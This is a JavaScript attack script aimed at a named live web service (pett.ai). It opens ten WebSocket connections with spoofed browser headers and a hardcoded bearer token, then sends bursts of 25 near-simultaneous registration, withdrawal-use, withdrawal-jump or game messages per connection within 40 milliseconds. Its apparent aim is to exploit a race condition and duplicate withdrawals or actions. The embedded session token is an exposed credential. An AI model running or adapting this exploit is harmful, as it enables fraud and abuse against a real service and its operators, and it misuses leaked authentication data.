import WebSocket from "ws";
import { v4 as uuidv4 } from "uuid";

const endpoint = "wss://ws.pett.ai/";
const origin = "https://app.pett.ai";
const pettName = `ao_cb_${Math.floor(Math.random() * 999)}_rs_${Math.floor(Math.random() * 999)}`;

const jwt = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlU3bU9NMzBNZGJRY3RQMmdoWE4wU0dhTDFIWjNSUWVoZWxkZUNHNF9OaWsifQ.eyJzaWQiOiJjbWgycDR4MXUwMTA5amkwYmYwdXQzdGF5IiwiaXNzIjoicHJpdnkuaW8iLCJpYXQiOjE3NjExODAwNjIsImF1ZCI6ImNtN2dldjVzNjAwdmJrMmxzajZlMWU5ZzciLCJzdWIiOiJkaWQ6cHJpdnk6Y21oMnA0eDRtMDEwYmppMGJyendtcnRvNyIsImV4cCI6MTc2MTE4MzY2Mn0.k2Zia_Qrvn-RP9EG2fB4eFZHkae7YevAIvlSYUrrIjoYykJkuoLaNYnO2YxU1q-DpFy1jWL1VytcC_Vbkr2g8g"


// ---- CONFIG ----
const type = 'register';

const TOTAL_SOCKETS = type != 'jump' ? 10 : 1;
const REQUESTS_PER_SOCKET = type != 'jump' ? 25 : 1;
const BLAST_DURATION_MS = 40;
const REST_BETWEEN_WAVES_MS = type != 'jump' ? 30000 : 500;

const withdrawalId = "830e54c8-a27b-469e-9fd0-b73dbd8d2d52";

// "32aee47a-3f3f-450c-8d41-cc960e77bca0"

// JUMPED
// "830e54c8-a27b-469e-9fd0-b73dbd8d2d52"

// ---- STATE ----
let sockets = [];
let totalSent = 0;
let totalReceived = 0;
let waveCounter = 0;
let blasting = false;

// ---- messages ----
function makeRegisterString() {
  return JSON.stringify({
    type: "REGISTER",
    data: {
      params: {
        authType: "privy",
        registerHash: { hash: jwt, name: pettName },
      },
    },
    nonce: uuidv4(),
  });
}

function makeAuthString() {
  return JSON.stringify({
    type: "AUTH",
    data: { params: { authType: "privy", authHash: { hash: jwt } } },
    nonce: uuidv4(),
  });
}

function makeJumpString() {
  return JSON.stringify({
    type: "WITHDRAWAL_JUMP",
    data: { params: { withdrawalId } },
    nonce: uuidv4()
})
}

function makeWithdrawString() {
  return JSON.stringify({
    type: "WITHDRAWAL_USE",
    data: {
        params: {
            withdrawalId
        }
    },
    nonce: uuidv4()
})
}

function makeDoorString() {
  return JSON.stringify({
    type: "PLAY_DOORS",
    data: {},
    nonce: uuidv4()
  })
}

// ---- send gradually ----
function blastWave() {
  const live = sockets.filter((s) => s.ws.readyState === WebSocket.OPEN);
  if (!live.length) {
    console.log("⚠ No live sockets remain, stopping");
    return;
  }

  blasting = true;
  waveCounter++;
  let sent = 0;

  const interval = BLAST_DURATION_MS / REQUESTS_PER_SOCKET;

  for (const { ws } of live) {
    for (let j = 0; j < REQUESTS_PER_SOCKET; j++) {
      type.toLowerCase() !== 'register' && ws.send(makeAuthString());
      setTimeout(() => {
        const t = type.toLowerCase();
        try {
          ws.send(
            t === 'register' ? makeRegisterString() : t === 'jump' ? makeJumpString() : t === 'door' ? makeDoorString() : t === 'withdraw' && makeWithdrawString(),
            { compress: false }
          );
          sent++;
        } catch {}
      }, j * interval);
    }
  }

  // finish after the whole window
  setTimeout(() => {
    totalSent += sent;
    console.log(
      `⚡ Wave #${waveCounter}: sent=${sent} · liveSockets=${live.length} · totalSent=${totalSent}`
    );
    blasting = false;
    setTimeout(blastWave, REST_BETWEEN_WAVES_MS);
  }, BLAST_DURATION_MS + 20);
}


// ---- sockets ----
function connectSocket(socketId) {
  const headers = {
    Origin: origin,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  };

  const ws = new WebSocket(endpoint, { headers, perMessageDeflate: false });

  ws.on("open", () => {
    sockets.push({ ws, id: socketId });
    console.log(`✅ Socket ${socketId} connected (${sockets.length}/${TOTAL_SOCKETS})`);

    // Start waves as soon as the initial pool is ready
    if (sockets.length === TOTAL_SOCKETS && !blasting) {
      console.log("🚀 All sockets ready — starting waves");
      blastWave();
    }
  });

  ws.on("message", (m) => {
    const msg = JSON.parse(m.toString());
    let t = msg.type;
    t.toLowerCase() !== 'auth_result' && console.log(msg);
    console.log(msg);
    let n = msg.error?.toLowerCase() === 'user already created';
    n ? totalReceived += 1 : totalReceived += 0
    console.log('Total cm Received=' + totalReceived);
  });

  ws.on("close", () => {
    console.log(`🔒 Socket ${socketId} closed`);
    sockets = sockets.filter((s) => s.id !== socketId);
    // no reconnect — continue with remaining sockets
  });

  ws.on("error", (err) => {
    console.error(`❌ Socket ${socketId} error:`, err.message);
  });
}

// ---- boot ----
console.log(`🔌 Opening ${TOTAL_SOCKETS} sockets…`);
for (let i = 0; i < TOTAL_SOCKETS; i++) connectSocket(i + 1);
